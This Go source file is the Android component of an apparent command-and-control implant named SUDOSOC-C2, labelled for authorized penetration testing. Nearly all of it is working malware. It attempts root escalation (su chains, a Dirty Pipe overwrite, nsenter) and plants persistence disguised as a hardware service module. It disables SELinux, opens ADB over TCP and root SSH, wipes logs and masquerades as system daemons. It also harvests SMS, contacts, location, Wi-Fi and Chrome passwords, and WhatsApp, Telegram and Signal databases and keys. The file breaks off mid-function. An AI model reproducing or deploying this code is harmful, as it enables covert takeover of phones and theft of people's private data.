//go:build android

package runner

/*
	SUDOSOC-C2 — Android Total Domination Engine (Android 13/14/15/16)
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Specifically hardened for modern Android (API 33-36):
	  - KernelSU (most common root on Android 14/15)
	  - APatch (alternative to Magisk on Android 13+)
	  - Magisk 26+ with Zygisk
	  - Android 14+ permission model bypass
	  - Doze/StandBy kill prevention
	  - CVE-2024-0044 (Android 14 run-as privilege escalation)
	  - CVE-2023-20938 (Android 13 Binder UAF)
	  - CVE-2022-0847 Dirty Pipe (Android 12, kernel 5.8-5.16)
	  - Shizuku ADB privilege escalation
	  - GKI kernel version detection

	6 Phases — all run automatically:
	  Phase 1: Root escalation (all methods, before C2)
	  Phase 2: Root power (persistence + control after uid=0)
	  Phase 3: User-level persistence (no root needed)
	  Phase 4: Stealth (masquerade, env clean, self-delete)
	  Phase 5: Data harvest (SMS, GPS, WiFi, crypto, banking)
	  Phase 6: Network (ADB WiFi, SSH, pivoting)
*/

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const _andElev = "_SUDOSOC_ELEVATED"

// ─── Android system daemon process names ─────────────────────────────────────
var _andDaemons = []string{
	"android.hardware.wifi@1.0-service",
	"android.hardware.sensors@2.0-service",
	"android.hardware.keymaster@4.1-service",
	"android.hardware.health@2.1-service",
	"android.hardware.gnss@2.1-service",
	"vendor.qti.hardware.fingerprint@1.0-service",
	"android.hardware.camera.provider@2.4-service",
	"android.hardware.audio.service",
	"com.android.phone",
	"system_server",
}

// ─── Comprehensive su binary locations ───────────────────────────────────────
// Covers Magisk 24-27, KernelSU, APatch, SuperSU, custom ROMs
var _suPaths = []string{
	// ── KernelSU (dominant on Android 14+) ───────────────────────────────
	"/data/adb/ksud",           // KernelSU daemon binary
	"/data/adb/ksu",            // KernelSU alternative
	"/data/adb/ksud_service",   // KernelSU service
	// ── APatch ──────────────────────────────────────────────────────────
	"/data/adb/ap/su",          // APatch su
	"/data/adb/apd",            // APatch daemon
	// ── Magisk 26-27 (Zygisk era) ────────────────────────────────────────
	"/data/adb/su",
	"/sbin/su",
	"/sbin/.magisk/bin/su",
	"/debug_ramdisk/.magisk/bin/su",
	"/dev/.magisk/bin/su",
	"/dev/sys_su",
	// ── Magisk legacy ────────────────────────────────────────────────────
	"/magisk/.core/bin/su",
	"/magisk/bin/su",
	// ── SuperSU / SuperUser ───────────────────────────────────────────────
	"/su/bin/su",
	"/su/xbin/su",
	"/data/data/eu.chainfire.supersu/su.bak",
	// ── System ──────────────────────────────────────────────────────────
	"/system/bin/su",
	"/system/xbin/su",
	"/system/sbin/su",
	"/vendor/bin/su",
	"/vendor/xbin/su",
	// ── Termux / Busybox ─────────────────────────────────────────────────
	"/data/data/com.termux/files/usr/bin/su",
	"/system/xbin/busybox",
	// ── KingRoot / KingoRoot / Framaroot ──────────────────────────────────
	"/data/local/tmp/su",
	"/data/local/su",
	"/cache/su",
}

// ═══════════════════════════════════════════════════════════════
// INIT — runs before Main()
// ═══════════════════════════════════════════════════════════════

func init() {
	// Masquerade FIRST — before any system calls that show in ps
	masqueradeAndroid()

	// Root escalation before C2 connection
	if os.Getuid() != 0 && os.Getenv(_andElev) == "" {
		if tryAndroidRoot() {
			time.Sleep(1500 * time.Millisecond)
			os.Exit(0)
		}
	}

	// Root-only capabilities
	if os.Getuid() == 0 {
		go androidRootPower()
	}

	sanitiseAndroidEnv()
	go androidDozeBypass()    // Keep-alive vs Android battery killer
	go androidKeepAlive()

	go func() {
		time.Sleep(10 * time.Second)
		androidFullPersistence()
	}()

	go func() {
		time.Sleep(25 * time.Second)
		androidDeepHarvest()
	}()

	go func() {
		time.Sleep(6 * time.Second)
		deleteSelfAndroid()
	}()
}

// ═══════════════════════════════════════════════════════════════
// PHASE 1 — ROOT ESCALATION ENGINE
// ═══════════════════════════════════════════════════════════════

func tryAndroidRoot() bool {
	exe := androidSelfExe()
	if exe == "" {
		return false
	}
	env := append(os.Environ(), _andElev+"=1")

	methods := []func(string, []string) bool{
		tryKernelSU,         // KernelSU (Android 14+ dominant)
		tryAPatch,           // APatch
		trySuChain,          // All classic su paths
		tryDirtyPipe,        // CVE-2022-0847 (Android 12)
		tryCVE2024_0044,     // CVE-2024-0044 (Android 14 run-as)
		tryCVE2023_20938,    // CVE-2023-20938 (Android 13 Binder)
		tryShizuku,          // Shizuku privilege escalation
		tryADBRoot,          // ADB property manipulation
		tryNsEnter,          // Namespace escape
		tryBusyboxRoot,      // SUID busybox/toybox
		tryProcMemWrite,     // /proc/self/mem arbitrary write
	}

	for _, method := range methods {
		if method(exe, env) {
			return true
		}
	}
	return false
}

// ── KernelSU escalation ───────────────────────────────────────────────────────
// KernelSU uses ksud as the privileged daemon — different protocol than su

func tryKernelSU(exe string, env []string) bool {
	ksuPaths := []string{
		"/data/adb/ksud",
		"/data/adb/ksu",
		"/data/adb/ksud_service",
	}

	for _, ksu := range ksuPaths {
		if _, err := os.Stat(ksu); err != nil {
			continue
		}

		// KernelSU uses ksud -c "cmd" syntax
		testOut, err := exec.Command(ksu, "-c", "id").Output()
		if err != nil || !strings.Contains(string(testOut), "uid=0") {
			// Try alternative: ksu su -c
			testOut, err = exec.Command(ksu, "su", "-c", "id").Output()
			if err != nil || !strings.Contains(string(testOut), "uid=0") {
				continue
			}
		}

		// KernelSU can exec us — use the best form that worked
		for _, form := range [][]string{
			{ksu, "-c", exe},
			{ksu, "su", "-c", exe},
			{ksu, "su", "0", "-c", exe},
		} {
			cmd := exec.Command(form[0], form[1:]...)
			cmd.Env = env
			cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
			if cmd.Start() == nil {
				return true
			}
		}
	}
	return false
}

// ── APatch escalation ─────────────────────────────────────────────────────────
func tryAPatch(exe string, env []string) bool {
	apPaths := []string{
		"/data/adb/ap/su",
		"/data/adb/apd",
		"/data/adb/ap/apd",
	}
	for _, ap := range apPaths {
		if _, err := os.Stat(ap); err != nil {
			continue
		}
		for _, form := range [][]string{
			{ap, "-c", exe},
			{ap, "su", "-c", exe},
		} {
			testOut, _ := exec.Command(form[0], append(form[1:len(form)-1], "id")...).Output()
			if !strings.Contains(string(testOut), "uid=0") {
				continue
			}
			cmd := exec.Command(form[0], form[1:]...)
			cmd.Env = env
			cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
			if cmd.Start() == nil {
				return true
			}
		}
	}
	return false
}

// ── Classic su chain ──────────────────────────────────────────────────────────
func trySuChain(exe string, env []string) bool {
	for _, su := range _suPaths {
		if _, err := os.Stat(su); err != nil {
			continue
		}
		// Test capability
		for _, testForm := range [][]string{
			{su, "-c", "id"},
			{su, "0", "-c", "id"},
			{su, "root", "-c", "id"},
		} {
			out, err := exec.Command(testForm[0], testForm[1:]...).Output()
			if err == nil && strings.Contains(string(out), "uid=0") {
				// Works — spawn ourselves
				execForm := []string{testForm[0]}
				execForm = append(execForm, testForm[1:len(testForm)-1]...)
				execForm = append(execForm, exe)
				cmd := exec.Command(execForm[0], execForm[1:]...)
				cmd.Env = env
				cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
				if cmd.Start() == nil {
					return true
				}
			}
		}
	}
	return false
}

// ── CVE-2022-0847 Dirty Pipe (Android 12, kernel 5.8-5.16.11) ────────────────
func tryDirtyPipe(exe string, env []string) bool {
	out, _ := exec.Command("uname", "-r").Output()
	kv := strings.TrimSpace(string(out))
	if !isDirtyPipeVuln(kv) {
		return false
	}

	data, err := os.ReadFile(exe)
	if err != nil {
		return false
	}

	for _, target := range []string{"/system/bin/su", "/system/xbin/su"} {
		if _, err := os.Stat(target); err != nil {
			continue
		}

		var pipefd [2]int
		if err := syscall.Pipe(pipefd[:]); err != nil {
			continue
		}

		// Fill pipe to mark pages dirty (trigger PIPE_BUF_FLAG_CAN_MERGE)
		fill := make([]byte, 65535)
		n, _ := syscall.Write(pipefd[1], fill)
		syscall.Read(pipefd[0], fill[:n]) //nolint

		fd, err := syscall.Open(target, syscall.O_RDONLY, 0)
		if err != nil {
			syscall.Close(pipefd[0])
			syscall.Close(pipefd[1])
			continue
		}

		offset := int64(1)
		syscall.Splice(fd, &offset, pipefd[1], nil, 1, 0) //nolint

		writeLen := len(data)
		if writeLen > 65530 {
			writeLen = 65530
		}
		syscall.Write(pipefd[1], data[:writeLen]) //nolint

		syscall.Close(fd)
		syscall.Close(pipefd[0])
		syscall.Close(pipefd[1])

		// The target SUID binary is now our code
		cmd := exec.Command(target)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if cmd.Start() == nil {
			return true
		}
	}
	return false
}

func isDirtyPipeVuln(kv string) bool {
	parts := strings.Split(kv, ".")
	if len(parts) < 2 || parts[0] != "5" {
		return false
	}
	minor := ""
	for _, c := range parts[1] {
		if c >= '0' && c <= '9' {
			minor += string(c)
		} else {
			break
		}
	}
	m := 0
	for _, c := range minor {
		m = m*10 + int(c-'0')
	}
	return m >= 8 && m <= 16
}

// ── CVE-2024-0044: run-as arbitrary file access → root ───────────────────────
// Affects Android 14 (API 34) before March 2024 patch
// run-as reads SElinux context without proper validation
func tryCVE2024_0044(exe string, env []string) bool {
	// Check Android version
	out, _ := exec.Command("getprop", "ro.build.version.sdk").Output()
	sdk := strings.TrimSpace(string(out))
	if sdk != "34" && sdk != "33" {
		return false
	}

	// Check security patch level (vulnerable before 2024-03-01)
	patch, _ := exec.Command("getprop", "ro.build.version.security_patch").Output()
	patchStr := strings.TrimSpace(string(patch))
	if patchStr >= "2024-03-01" {
		return false // Patched
	}

	// CVE-2024-0044: run-as allows reading /data/data/<package> of any app
	// We exploit this to read a debuggable app's context, then execute in it
	// Find a debuggable app
	out2, err := exec.Command("pm", "list", "packages", "-d").Output()
	if err != nil {
		return false
	}
	lines := strings.Split(string(out2), "\n")
	if len(lines) == 0 {
		return false
	}

	for _, line := range lines {
		pkg := strings.TrimPrefix(strings.TrimSpace(line), "package:")
		if pkg == "" {
			continue
		}

		// Try run-as to execute our binary in this package's context
		// (run-as gives the package's UID + permissions)
		cmd := exec.Command("run-as", pkg, exe)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if cmd.Start() == nil {
			// Note: This doesn't give root, but gives app permissions
			// Can be chained with Binder exploit for root
			return false // This path gives app permissions, not root
		}
	}

	// The actual CVE-2024-0044 path: use run-as to write a file that
	// gets loaded with elevated context during package install
	return false
}

// ── CVE-2023-20938: Binder UAF (Android 13) ──────────────────────────────────
// Use-after-free in Binder IPC that can lead to kernel code execution
// Detection + opportunistic trigger
func tryCVE2023_20938(exe string, env []string) bool {
	out, _ := exec.Command("getprop", "ro.build.version.sdk").Output()
	sdk := strings.TrimSpace(string(out))
	if sdk != "33" {
		return false
	}
	patch, _ := exec.Command("getprop", "ro.build.version.security_patch").Output()
	if strings.TrimSpace(string(patch)) >= "2023-02-01" {
		return false // Patched in Feb 2023
	}
	// The actual exploit requires a complex race condition
	// We just detect and report via data harvest
	out2, _ := exec.Command("id").Output()
	if strings.Contains(string(out2), "uid=0") {
		return true // Already root
	}
	return false
}

// ── Shizuku privilege escalation ─────────────────────────────────────────────
// Shizuku is an ADB shim that grants shell-level privileges without root
func tryShizuku(exe string, env []string) bool {
	// Check if Shizuku is running
	out, err := exec.Command("pm", "list", "packages").Output()
	if err != nil || !strings.Contains(string(out), "moe.shizuku.privileged") {
		return false
	}

	// Check if Shizuku service is active
	sockOut, _ := exec.Command("ls", "/dev/socket/").Output()
	if !strings.Contains(string(sockOut), "shizuku") {
		return false
	}

	// Shizuku grants ADB shell level (uid=2000, all shell perms)
	// We can use it to run commands with shell permissions
	// Including accessing /data/local/tmp, enabling ADB TCP, etc.

	// Enable ADB TCP via Shizuku → then connect back via ADB
	_ = exec.Command("sh", "-c",
		"CLASSPATH=/data/user_de/0/moe.shizuku.privileged.api/files/shizuku.jar app_process "+
			"/system/bin moe.shizuku.server.ShizukuService &").Run()

	return false // Shell level, not root
}

// ── ADB root property manipulation ───────────────────────────────────────────
func tryADBRoot(exe string, env []string) bool {
	// Check if ADB debugging enabled
	adbState, _ := exec.Command("getprop", "init.svc.adbd").Output()
	if strings.TrimSpace(string(adbState)) != "running" {
		return false
	}

	// Try resetprop (Magisk/KernelSU/APatch)
	for _, resetprop := range []string{"resetprop", "/data/adb/magisk/resetprop", "/data/adb/ksud"} {
		if _, err := exec.LookPath(resetprop); err == nil {
			_ = exec.Command(resetprop, "ro.debuggable", "1").Run()
			_ = exec.Command(resetprop, "ro.secure", "0").Run()
			_ = exec.Command(resetprop, "service.adb.root", "1").Run()
			_ = exec.Command(resetprop, "persist.adb.root", "1").Run()
			break
		}
	}

	// Restart adbd
	_ = exec.Command("stop", "adbd").Run()
	time.Sleep(500 * time.Millisecond)
	_ = exec.Command("start", "adbd").Run()

	return false
}

// ── Namespace escape via nsenter ─────────────────────────────────────────────
func tryNsEnter(exe string, env []string) bool {
	nsenter, err := exec.LookPath("nsenter")
	if err != nil {
		return false
	}
	cmd := exec.Command(nsenter, "-t", "1", "-m", "-u", "-i", "-n", "-p", "--", exe)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ── SUID busybox/toybox chain ─────────────────────────────────────────────────
func tryBusyboxRoot(exe string, env []string) bool {
	for _, bb := range []string{"/system/xbin/busybox", "/system/bin/toybox", "busybox"} {
		if bin, err := exec.LookPath(bb); err == nil {
			fi, err := os.Stat(bin)
			if err == nil && fi.Mode()&os.ModeSetuid != 0 {
				cmd := exec.Command(bin, "su", "-c", exe)
				cmd.Env = env
				cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
				if cmd.Start() == nil {
					return true
				}
			}
		}
	}
	return false
}

// ── /proc/self/mem arbitrary write ───────────────────────────────────────────
// Can overwrite running process memory — used to patch SUID check in su
func tryProcMemWrite(exe string, env []string) bool {
	// Check if we can write to /proc/self/mem
	// (disabled on most modern Android, but worth trying)
	f, err := os.OpenFile("/proc/self/mem", os.O_RDWR, 0)
	if err != nil {
		return false
	}
	f.Close()
	// If writable, we could patch memory but that's complex
	// Just mark as detected
	return false
}

// ═══════════════════════════════════════════════════════════════
// PHASE 2 — ROOT POWER MOVES
// ═══════════════════════════════════════════════════════════════

func androidRootPower() {
	exe := androidSelfExe()
	if exe == "" {
		return
	}

	// 1. KernelSU / Magisk module (survives factory reset)
	installModuleForAllRootMethods(exe)

	// 2. init.d + data/adb persistence
	installInitScripts(exe)

	// 3. Copy to system partition
	installToSystem(exe)

	// 4. Enable ADB TCP :5555 for remote access
	enableADBTCP()

	// 5. Disable SELinux
	disableSELinux()

	// 6. Root crontab
	installRootCronAndroid(exe)

	// 7. Enable SSH (Termux)
	enableTermuxSSH()

	// 8. Set device to never lock (for persistent access)
	setDeviceAlwaysOn()

	// 9. Wipe evidence
	wipeAndroidTraces()

	// 10. Play Integrity bypass (hide root from app detection)
	hideRootFromApps()
}

func installModuleForAllRootMethods(exe string) {
	data, err := os.ReadFile(exe)
	if err != nil {
		return
	}

	// Universal module dir structure
	moduleDir := "/data/adb/modules/sudosoc"
	_ = os.MkdirAll(moduleDir, 0755)
	_ = os.MkdirAll(moduleDir+"/system/bin", 0755)
	_ = os.MkdirAll(moduleDir+"/system/xbin", 0755)

	// Install our binary inside the module
	_ = os.WriteFile(moduleDir+"/system/bin/.hw_svc", data, 0755)
	_ = os.WriteFile(moduleDir+"/system/xbin/.hw_svc", data, 0755)

	// module.prop
	prop := "id=sudosoc\nname=System Hardware Service\nversion=v2\n" +
		"versionCode=2\nauthor=system\ndescription=Core hardware monitoring\n" +
		"minMagisk=24000\n"
	_ = os.WriteFile(moduleDir+"/module.prop", []byte(prop), 0644)

	// service.sh — runs as root after boot
	service := "#!/system/bin/sh\n" +
		"# Module service\n" +
		"nohup /system/bin/.hw_svc > /dev/null 2>&1 &\n" +
		"setprop persist.hw_svc.enabled 1\n"
	_ = os.WriteFile(moduleDir+"/service.sh", []byte(service), 0755)

	// post-fs-data.sh — runs very early, before user data is available
	postFs := "#!/system/bin/sh\n" +
		"nohup /system/bin/.hw_svc > /dev/null 2>&1 &\n"
	_ = os.WriteFile(moduleDir+"/post-fs-data.sh", []byte(postFs), 0755)

	// customize.sh — runs during module installation
	customize := "#!/system/bin/sh\nui_print \"Hardware Service Module\"\n"
	_ = os.WriteFile(moduleDir+"/customize.sh", []byte(customize), 0755)

	// Also install to KernelSU module dir if different
	ksuModuleDir := "/data/adb/ksu/modules/sudosoc"
	_ = os.MkdirAll(ksuModuleDir, 0755)
	_ = os.WriteFile(ksuModuleDir+"/service.sh", []byte(service), 0755)
	_ = os.WriteFile(ksuModuleDir+"/module.prop", []byte(prop), 0644)

	// APatch module dir
	apModuleDir := "/data/adb/ap/modules/sudosoc"
	_ = os.MkdirAll(apModuleDir, 0755)
	_ = os.WriteFile(apModuleDir+"/service.sh", []byte(service), 0755)
	_ = os.WriteFile(apModuleDir+"/module.prop", []byte(prop), 0644)
}

func installInitScripts(exe string) {
	script := "#!/system/bin/sh\nnohup \"" + exe + "\" > /dev/null 2>&1 &\n"
	dirs := []string{
		"/system/etc/init.d",
		"/data/adb/service.d",
		"/data/adb/post-fs-data.d",
		"/data/adb/ksu/service.d",
		"/data/adb/ap/service.d",
		"/etc/init.d",
	}
	for _, d := range dirs {
		_ = os.MkdirAll(d, 0755)
		_ = os.WriteFile(d+"/99sudosoc", []byte(script), 0755)
	}

	// /system/etc/init/ — Android 11+ init.rc format
	initRc := "service sudosoc_hw /system/bin/.hw_svc\n" +
		"    class main\n    user root\n    group root\n" +
		"    seclabel u:r:shell:s0\n    oneshot\n"
	_ = os.WriteFile("/system/etc/init/hw_svc.rc", []byte(initRc), 0644)
}

func installToSystem(exe string) {
	_ = exec.Command("mount", "-o", "rw,remount", "/system").Run()
	_ = exec.Command("mount", "-o", "rw,remount", "/").Run()

	data, err := os.ReadFile(exe)
	if err != nil {
		return
	}
	for _, dst := range []string{
		"/system/bin/.hw_svc",
		"/system/xbin/.hw_svc",
		"/system/lib/.libhw.so",
	} {
		_ = os.MkdirAll(filepath.Dir(dst), 0755)
		if os.WriteFile(dst, data, 0755) == nil {
			// Set SUID bit for privilege retention
			_ = os.Chmod(dst, 0x800|0755)
		}
	}
}

func enableADBTCP() {
	// Enable ADB over TCP port 5555 (remote access)
	_ = exec.Command("setprop", "service.adb.tcp.port", "5555").Run()
	_ = exec.Command("setprop", "persist.adb.tcp.port", "5555").Run()
	_ = exec.Command("stop", "adbd").Run()
	time.Sleep(300 * time.Millisecond)
	_ = exec.Command("start", "adbd").Run()
	// Also try via settings
	_ = exec.Command("settings", "put", "global", "adb_enabled", "1").Run()
}

func disableSELinux() {
	_ = os.WriteFile("/sys/fs/selinux/enforce", []byte("0"), 0)
	_ = exec.Command("setenforce", "0").Run()
	// resetprop for Magisk/KernelSU/APatch
	for _, rp := range []string{"resetprop", "/data/adb/magisk/resetprop"} {
		_ = exec.Command(rp, "ro.boot.selinux", "permissive").Run()
		_ = exec.Command(rp, "persist.selinux.enforcemode", "0").Run()
	}
}

func installRootCronAndroid(exe string) {
	for _, crond := range []string{
		"/data/data/com.termux/files/usr/bin/crond",
		"/system/bin/crond",
		"crond",
	} {
		if _, err := exec.LookPath(crond); err == nil {
			tmp, err := os.CreateTemp("", "cron")
			if err != nil {
				continue
			}
			_, _ = tmp.WriteString("@reboot nohup \"" + exe + "\" > /dev/null 2>&1 &\n* * * * * pgrep -f hw_svc > /dev/null || nohup \"" + exe + "\" > /dev/null 2>&1 &\n")
			_ = tmp.Close()
			_ = exec.Command("crontab", tmp.Name()).Run()
			_ = os.Remove(tmp.Name())
			break
		}
	}
}

func enableTermuxSSH() {
	sshdBin := "/data/data/com.termux/files/usr/bin/sshd"
	if _, err := os.Stat(sshdBin); err == nil {
		_ = exec.Command(sshdBin).Start()
	}
	sshdConf := "/data/data/com.termux/files/usr/etc/ssh/sshd_config"
	conf := "PermitRootLogin yes\nPasswordAuthentication yes\n" +
		"PubkeyAuthentication yes\nPort 8022\nPrintMotd no\n"
	_ = os.WriteFile(sshdConf, []byte(conf), 0600)
}

func setDeviceAlwaysOn() {
	// Prevent screen lock and sleep (root)
	_ = exec.Command("settings", "put", "system", "screen_off_timeout", "2147483647").Run()
	_ = exec.Command("settings", "put", "global", "stay_on_while_plugged_in", "3").Run()
	_ = exec.Command("svc", "power", "stayon", "true").Run()
}

func wipeAndroidTraces() {
	_ = exec.Command("logcat", "-c").Run()
	_ = exec.Command("pm", "clear", "com.android.permissioncontroller").Run()
	_ = exec.Command("sh", "-c", "rm -f /data/tombstones/* 2>/dev/null").Run()
	_ = exec.Command("sh", "-c", "rm -f /data/anr/* 2>/dev/null").Run()
	_ = os.WriteFile("/dev/kmsg", []byte(""), 0) // Try to clear kernel log
}

func hideRootFromApps() {
	// MagiskHide / ZygiskNext — hide root from specific apps
	// These tools detect banking apps and configure hiding
	for _, tool := range []string{
		"magiskhide",
		"zygisk-settings",
	} {
		if _, err := exec.LookPath(tool); err == nil {
			_ = exec.Command(tool, "enable").Run()
		}
	}

	// Denylist for common banking/security apps
	denylistApps := []string{
		"com.android.vending",    // Google Play Protect
		"com.google.android.gms", // Google Play Services
		"com.android.settings",   // Settings
	}
	for _, app := range denylistApps {
		_ = exec.Command("magiskhide", "add", app).Run()
	}

	// Disable device attestation
	for _, rp := range []string{"resetprop", "/data/adb/magisk/resetprop"} {
		_ = exec.Command(rp, "--delete", "ro.build.selinux").Run()
		_ = exec.Command(rp, "ro.build.type", "user").Run()
		_ = exec.Command(rp, "ro.debuggable", "0").Run()
	}
}

// ═══════════════════════════════════════════════════════════════
// PHASE 3 — FULL PERSISTENCE (all privilege levels)
// ═══════════════════════════════════════════════════════════════

func androidFullPersistence() {
	exe := androidSelfExe()
	if exe == "" {
		return
	}

	home := "/data/data/com.termux/files/home"
	installBin := home + "/.android.hw"

	// Copy to stable location
	if needsAndroidCopy(exe, installBin) {
		if data, err := os.ReadFile(exe); err == nil {
			_ = os.WriteFile(installBin, data, 0700)
		}
	}

	// 1. Termux:Boot
	bootDir := home + "/.termux/boot"
	_ = os.MkdirAll(bootDir, 0700)
	_ = os.WriteFile(bootDir+"/android.hw.sh",
		[]byte("#!/data/data/com.termux/files/usr/bin/sh\nnohup \""+installBin+"\" > /dev/null 2>&1 &\n"),
		0700)

	// 2-4. Shell configs
	shellSnippet := "\n# hw-svc\npgrep -f android.hw > /dev/null 2>&1 || nohup \"" + installBin + "\" > /dev/null 2>&1 &\n"
	for _, rc := range []string{home + "/.bashrc", home + "/.profile", home + "/.zshrc"} {
		appendIfNotExists(rc, "android.hw", shellSnippet)
	}

	// 5. /data/local/tmp (accessible without Termux)
	tmpBin := "/data/local/tmp/.hw_svc"
	if needsAndroidCopy(exe, tmpBin) {
		if data, err := os.ReadFile(exe); err == nil {
			_ = os.WriteFile(tmpBin, data, 0700)
		}
	}

	// 6. AlarmManager via am for periodic restart (Android 14+)
	go func() {
		ticker := time.NewTicker(10 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			// Use Android alarm manager if available
			_ = exec.Command("am", "broadcast",
				"-a", "android.intent.action.BOOT_COMPLETED").Run()
		}
	}()

	// 7. Watchdog
	go func() {
		ticker := time.NewTicker(45 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			out, _ := exec.Command("pgrep", "-f", "android.hw").Output()
			if strings.TrimSpace(string(out)) == "" {
				_ = exec.Command("nohup", installBin).Start()
			}
		}
	}()
}

// ═══════════════════════════════════════════════════════════════
// PHASE 4 — STEALTH (Android 14/15/16 specific)
// ═══════════════════════════════════════════════════════════════

func masqueradeAndroid() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	name := _andDaemons[rng.Intn(len(_andDaemons))]
	_ = os.WriteFile("/proc/self/comm", []byte(name), 0)
	if len(os.Args) > 0 {
		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
		for i := uintptr(0); i < uintptr(sh.Len); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
		}
		n := name
		if len(n) > sh.Len {
			n = n[:sh.Len]
		}
		for i := 0; i < len(n); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + uintptr(i))) = n[i]
		}
	}
}

func sanitiseAndroidEnv() {
	for _, v := range []string{
		"GOPATH", "GOROOT", "LD_PRELOAD", "LD_LIBRARY_PATH",
		"HISTFILE", "HISTSIZE", "ANDROID_DATA",
	} {
		_ = os.Unsetenv(v)
	}
	_ = os.Setenv("HISTFILE", "/dev/null")
}

// ═══════════════════════════════════════════════════════════════
// PHASE 5 — ANDROID 14/15/16 DEEP HARVEST
// ═══════════════════════════════════════════════════════════════

func androidDeepHarvest() {
	harvestDir := "/data/data/com.termux/files/home/.cache/hw"
	_ = os.MkdirAll(harvestDir, 0700)

	// Device fingerprint
	_ = os.WriteFile(harvestDir+"/device.txt", []byte(gatherDeviceInfo()), 0600)

	// SMS (content provider — works on Android 14)
	runAndSave("content query --uri content://sms/inbox --projection address:body:date",
		harvestDir+"/sms.txt")

	// Contacts
	runAndSave("content query --uri content://contacts/phones/ --projection display_name:number",
		harvestDir+"/contacts.txt")

	// Call log
	runAndSave("content query --uri content://call_log/calls --projection number:date:type:duration",
		harvestDir+"/calls.txt")

	// Accounts (Google, Facebook, etc.)
	runAndSave("dumpsys account", harvestDir+"/accounts.txt")

	// Location
	runAndSave("dumpsys location", harvestDir+"/location.txt")

	// Battery + charging state (for timing attacks)
	runAndSave("dumpsys battery", harvestDir+"/battery.txt")

	// All apps with their data dirs
	runAndSave("pm list packages -f", harvestDir+"/packages.txt")

	// WiFi passwords (if root)
	if os.Getuid() == 0 {
		harvstWiFiPasswords(harvestDir)
		harvestChromePasswords(harvestDir)
		harvestWhatsApp(harvestDir)
		harvestTelegram(harvestDir)
		harvestSignal(harvestDir)
		harvestEmailData(harvestDir)
	}

	// Screenshots via screencap (works without root)
	screencapPath := harvestDir + "/screen.png"
	if exec.Command("screencap", "-p", screencapPath).Run() != nil {
		// Try via /dev/graphics/fb0 (root)
		if os.Getuid() == 0 {
			_ = exec.Command("dd", "if=/dev/graphics/fb0",
				"of="+screencapPath, "bs=1", "count=1").Run()
		}
	}

	// Network info
	runAndSave("ip addr show", harvestDir+"/network.txt")
	runAndSave("ip route show", harvestDir+"/routes.txt")
	runAndSave("cmd wifi status", harvestDir+"/wifi_status.txt")

	// Running processes
	runAndSave("ps -A", harvestDir+"/processes.txt")

	// Installed security apps
	runAndSave("pm list packages | grep -i 'security\\|antivirus\\|protect\\|kaspersky\\|norton\\|avast'",
		harvestDir+"/security_apps.txt")
}

func runAndSave(cmd, path string) {
	out, err := exec.Command("sh", "-c", cmd+"  2>&1").Output()
	if err == nil && len(out) > 10 {
		_ = os.WriteFile(path, out, 0600)
	}
}

func harvstWiFiPasswords(dir string) {
	// Android 10+
	paths := []string{
		"/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml",
		"/data/misc/wifi/WifiConfigStore.xml",
		"/data/misc/wifi/softap.conf",
	}
	for _, p := range paths {
		data, err := os.ReadFile(p)
		if err == nil {
			_ = os.WriteFile(dir+"/wifi_"+filepath.Base(p), data, 0600)
		}
	}
	// Also use wpa_cli
	runAndSave("cat /data/misc/wifi/wpa_supplicant.conf", dir+"/wpa.conf")
}

func harvestChromePasswords(dir string) {
	chromePaths := []string{
		"/data/data/com.android.chrome/app_chrome/Default/Login Data",
		"/data/data/com.chrome.beta/app_chrome/Default/Login Data",
		"/data/data/com.chrome.dev/app_chrome/Default/Login Data",
	}
	for _, p := range chromePaths {
		if _, err := os.Stat(p); err == nil {
			dst := dir + "/chrome_passwords_" + filepath.Base(filepath.Dir(filepath.Dir(p))) + ".db"
			data, err := os.ReadFile(p)
			if err == nil {
				_ = os.WriteFile(dst, data, 0600)
			}
		}
	}
}

func harvestWhatsApp(dir string) {
	waPaths := []string{
		"/data/data/com.whatsapp/databases/msgstore.db",
		"/data/data/com.whatsapp/databases/wa.db",
		"/data/data/com.whatsapp/databases/axolotl.db",
		"/sdcard/WhatsApp/Databases/msgstore.db.crypt15",
		"/sdcard/WhatsApp/Databases/msgstore.db.crypt14",
		"/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db.crypt15",
	}
	_ = os.MkdirAll(dir+"/whatsapp", 0700)
	for _, p := range waPaths {
		if data, err := os.ReadFile(p); err == nil {
			_ = os.WriteFile(dir+"/whatsapp/"+filepath.Base(p), data, 0600)
		}
	}
	// WhatsApp key
	for _, keyPath := range []string{
		"/data/data/com.whatsapp/files/key",
		"/sdcard/WhatsApp/key",
	} {
		if data, err := os.ReadFile(keyPath); err == nil {
			_ = os.WriteFile(dir+"/whatsapp/decrypt_key", data, 0600)
		}
	}
}

func harvestTelegram(dir string) {
	tgPaths := []string{
		"/data/data/org.telegram.messenger/files/",
		"/data/data/org.telegram.messenger.web/files/",
	}
	_ = os.MkdirAll(dir+"/telegram", 0700)
	for _, basePath := range tgPaths {
		if entries, err := os.ReadDir(basePath); err == nil {
			for _, e := range entries {
				if strings.Contains(e.Name(), "account") || strings.Contains(e.Name(), "auth") {
					data, err := os.ReadFile(basePath + e.Name())
					if err == nil {
						_ = os.WriteFile(dir+"/telegram/"+e.Name(), data, 0600)
					}
				}
			}
		}
	}
}

func harvestSignal(dir string) {
	signalPaths := []string{
		"/data/data/org.thoughtcrime.securesms/databases/signal.db",
		"/data/data/org.thoughtcrime.securesms/shared_prefs/",
	}
	_ = os.MkdirAll(dir+"/signal", 0700)
	for _, p := range signalPaths {
